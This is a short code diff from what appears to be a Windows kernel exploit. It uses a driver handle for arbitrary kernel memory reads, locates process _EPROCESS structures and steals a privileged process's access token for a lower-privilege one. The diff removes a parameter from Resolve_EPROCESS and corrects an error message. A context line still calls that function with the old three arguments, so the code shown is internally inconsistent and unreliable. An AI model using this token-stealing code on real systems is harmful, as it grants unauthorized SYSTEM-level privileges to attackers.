@@ -45,7 +45,7 @@ BOOL MemArbitraryRead(HANDLE hdriver, DWORD64 addr, DWORD64* outValue) {
     return ok;
 }
 
-DWORD64 Resolve_EPROCESS(HANDLE hdriver, DWORD64 k_base, DWORD pid){
+DWORD64 Resolve_EPROCESS(HANDLE hdriver, DWORD pid){
 
     // Resolve address of PsInitialSystemProcess kernel symbol
     ULONG_PTR ps_initial_sys_proc = ResolveKsym("PsInitialSystemProcess"); 
@@ -95,7 +95,7 @@ BOOL StealToken(HANDLE hdriver, DWORD64 k_base, DWORD low_proc_pid, DWORD high_p
     DWORD64 high_proc_eprocess = Resolve_EPROCESS(hdriver, k_base, high_proc_pid);
 
     if (!low_proc_eprocess) {
-        printf("[!] _EPROCESS for PID: %lu (Could not be found)\n", high_proc_pid);
+        printf("[!] _EPROCESS for PID: %lu (Could not be found)\n", low_proc_pid);
         return FALSE;
     }
     if (!high_proc_eprocess) {
